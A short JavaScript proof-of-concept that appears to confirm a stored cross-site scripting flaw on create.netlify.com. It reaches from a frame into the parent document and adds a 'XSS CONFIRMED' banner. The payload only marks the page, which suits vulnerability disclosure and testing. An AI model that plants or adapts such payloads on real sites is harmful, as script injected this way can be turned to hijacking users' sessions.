(() => {
  const root = parent.document.documentElement;
  root.setAttribute('data-create-custom-xss', 'confirmed');

  if (!parent.document.getElementById('create-custom-xss-proof')) {
    const marker = parent.document.createElement('div');
    marker.id = 'create-custom-xss-proof';
    marker.textContent = 'XSS CONFIRMED: stored custom control executed on create.netlify.com';
    Object.assign(marker.style, {
      position: 'fixed',
      top: '12px',
      left: '50%',
      transform: 'translateX(-50%)',
      zIndex: '2147483647',
      padding: '12px 18px',
      border: '3px solid #0a0',
      borderRadius: '8px',
      background: '#fff',
      color: '#070',
      font: '700 16px system-ui'
    });
    parent.document.body.appendChild(marker);
  }
})();
